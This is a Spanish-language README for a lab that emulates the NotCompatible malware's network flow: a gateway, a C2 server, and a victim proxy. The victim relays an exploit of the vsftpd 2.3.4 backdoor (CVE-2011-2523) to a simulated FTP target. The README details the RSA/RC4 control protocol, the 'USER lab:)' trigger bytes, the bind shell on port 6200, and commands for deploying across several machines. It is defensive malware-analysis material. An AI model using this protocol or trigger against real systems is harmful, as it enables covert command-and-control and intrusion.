# Laboratorio NotCompatible: GW, C2, proxy y objetivo FTP

Este laboratorio reproduce el flujo de red observado en la muestra analizada:

```text
GW  <── control RSA/RC4 ──>  víctima/proxy  <── FTP claro ──> objetivo FTP
                               ▲      │
                               │      └──────── TCP/6200 claro ────────┘
                               │
                         control RSA/RC4
                               │
                              C2
```

El C2 **no conecta directamente** al FTP. Ordena a la víctima abrir los dos
flujos TCP y encapsula los bytes de ataque en `SEND`; la víctima devuelve los
bytes recibidos mediante `RECV`.

El objetivo es una emulación segura de la conducta de
[CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523), la puerta
trasera introducida en el tarball de vsftpd 2.3.4. Se utiliza la secuencia
documentada por el
[módulo de Rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/):
un nombre de usuario que contiene `:)`, seguido de `PASS`, provoca la aparición
de un bind shell en TCP/6200. El shell de este laboratorio solamente implementa
`id`; no ejecuta órdenes arbitrarias.

## Requisitos y preparación

Usar Python 3.10 o posterior. Desde este directorio:

```powershell
python -m pip install -r requirements.txt
python -m tools.generate_keys
```

Las claves ya incluidas permiten ejecutar directamente el laboratorio. Para
crear otra `RSAGlobal`:

```powershell
python -m tools.generate_keys --force
```

Esto crea una clave privada para que GW/C2 firmen `SET`, una pública para que la
víctima los valide y el módulo público crudo de 128 bytes.

## Lanzamiento

Abrir cuatro terminales en este directorio y respetar este orden:

**Terminal 1 — objetivo FTP**

```powershell
python -m ftp_target.ftp_target
```

**Terminal 2 — C2 operacional**

```powershell
python -m c2.c2_server
```

**Terminal 3 — gateway**

```powershell
python -m gateway.gateway
```

**Terminal 4 — víctima/proxy**

```powershell
python -m victim.victim_proxy
```

Cada proceso permanece activo y admite `Ctrl+C`. La ejecución correcta termina
el ejercicio con `LAB FLOW COMPLETED SUCCESSFULLY` en el C2. Después se pueden
cerrar los cuatro procesos con `Ctrl+C`.

La prueba automática levanta los cuatro roles, valida el resultado y los cierra:

```powershell
python -m tools.integration_test
```

## Puertos predeterminados

| Flujo | Destino | Puerto |
|---|---|---:|
| Control inicial | GW | 18443/TCP |
| Control operacional | C2 | 19443/TCP |
| Proxy de explotación, canal 1 | FTP | 2121/TCP |
| Proxy de explotación, canal 2 | bind shell simulado | 6200/TCP |

Se usan 18443 y 19443 para no necesitar privilegios. Pueden sustituirse por 443
con `--listen-port 443`, siempre que el sistema permita enlazarlo. Aunque se use
443, **no hay TLS**.

## Secuencia implementada

1. La víctima genera una pareja `RSALocal` de 1024 bits. Conserva la misma
   pareja durante ambas conexiones de control.
2. Abre TCP hacia el GW y envía `u32le(128) || módulo_RSAlocal`.
3. El GW responde `u32le(128) || RSA_raw(marcador || clave_RC4_de_100_bytes)`.
   A partir de ese byte, todo el protocolo de control va cifrado con RC4.
4. La víctima envía `HELO` con grupo 0 y `FB`.
5. El GW envía un `SET` con grupos 0 y 1, `LID=2` y firma `RSAGlobal`.
   La víctima valida la firma antes de instalarlo. `SET` no tiene ACK.
6. El GW envía `SETGROUP=1`. La víctima persiste el grupo, cierra el flujo al GW
   y conecta al C2 anunciado en el grupo 1.
7. Se repite la distribución de clave RC4 con el **mismo módulo RSALocal** y una
   clave RC4 nueva. El segundo `HELO` ya lleva grupo 1 y no contiene `FB`.
8. El C2 envía otro `SET`, ahora con `LID=3`, firmado por la misma `RSAGlobal`.
   La víctima vuelve a verificarlo. Tampoco existe ACK para `SET`.
9. `PING` recibe `PONG`.
10. `CONN CH=1 IP=127.0.0.1 PORT=2121` ordena a la víctima abrir el flujo FTP.
    La respuesta es `CONN CH=1` o `NOCN CH=1`.
11. El banner FTP llega al C2 dentro de `RECV CH=1`.
12. Dos `SEND CH=1` transportan literalmente:

    ```text
    55 53 45 52 20 6c 61 62 3a 29 0d 0a  USER lab:)\r\n
    50 41 53 53 20 6c 61 62 0d 0a        PASS lab\r\n
    ```

    `SEND` no tiene ACK propio: las respuestas `331` y `530` del FTP aparecen
    después en uno o más `RECV`.
13. `CONN CH=2 ... PORT=6200` crea un **segundo** flujo TCP desde la víctima al
    bind shell simulado.
14. `SEND CH=2` transporta `69 64 0a` (`id\n`). La prueba de explotación vuelve
    como `RECV CH=2` y contiene `uid=0(root)...`.
15. El C2 envía `SHUT CH=2 DT=""`; la víctima cierra ese socket y responde
    `DISC CH=2`. Después repite `SHUT`/`DISC` para el canal 1.

El hijo `DT` vacío de `SHUT` es intencionado: el método `RecvSHUT` de la muestra
lo exige aunque no utilice su contenido.

## Formato binario y criptografía

Cada paquete descifrado usa:

```text
u32le tamaño_total
u8    (bit 7 = contiene hijos; bits 0..6 = longitud de etiqueta)
ASCII etiqueta
bytes de datos, o paquetes hijo concatenados
```

Hay dos objetos RC4 por sesión, uno por sentido. Ambos parten de la misma clave,
pero su estado avanza de forma independiente y continua: reiniciarlo por paquete
rompería el flujo.

`RSAGlobal` no cifra el canal. Sólo autentica `SET`: se calcula
`SHA1(pack(DATA))`, se aplica la operación RSA privada sin un esquema de firma
estándar y la víctima compara los 20 bytes finales obtenidos mediante la
operación pública. `RSALocal`, en cambio, sólo protege la entrega de cada clave
RC4. El FTP y TCP/6200 no usan RSA ni RC4.

## Qué se observa en una captura

Filtro de Wireshark:

```text
tcp.port == 18443 || tcp.port == 19443 || tcp.port == 2121 || tcp.port == 6200
```

En los flujos GW y C2 se ven primero 132 bytes en cada sentido: cuatro bytes
little-endian `80 00 00 00` y un bloque de 128 bytes. Lo siguiente es
ciphertext RC4 de alta entropía; no aparece un `ClientHello`, un tipo de registro
TLS ni HTTP.

En 2121/TCP sí son visibles el banner, `USER lab:)`, `PASS lab` y las respuestas
FTP. En 6200/TCP son visibles `id\n` y `uid=0(root)...`. Las conexiones hacia
2121 y 6200 se originan en la víctima, no en el C2.

En Windows, para capturar tráfico `127.0.0.1` hay que seleccionar el adaptador
de loopback de Npcap.

## Ejecución distribuida

Para separar los roles entre máquinas o VMs:

```powershell
# Objetivo FTP
python -m ftp_target.ftp_target --listen-host 0.0.0.0

# C2
python -m c2.c2_server --listen-host 0.0.0.0 --advertise-host <IP_C2> `
  --gw-host <IP_GW> --target-host <IP_FTP>

# GW
python -m gateway.gateway --listen-host 0.0.0.0 --advertise-host <IP_GW> `
  --c2-host <IP_C2>

# Víctima
python -m victim.victim_proxy --gw-host <IP_GW>
```

Los valores anunciados en los `SET` deben ser IPv4 alcanzables desde la víctima.
Si más adelante se sustituye la víctima Python por el APK real, su
`RSAGlobal` embebida debe reemplazarse por
`keys/global_public_modulus.bin`; de lo contrario rechazará ambos `SET`.

## Organización

```text
c2/          servidor C2 y orquestación de CONN/SEND/SHUT
gateway/     GW, SET firmado y SETGROUP
victim/      cliente de control y proxy TCP
ftp_target/  emulación segura de CVE-2011-2523
shared/      framing, RSA, RC4 y sesiones
tools/       generación de claves y prueba de integración
keys/        RSAGlobal de laboratorio
```
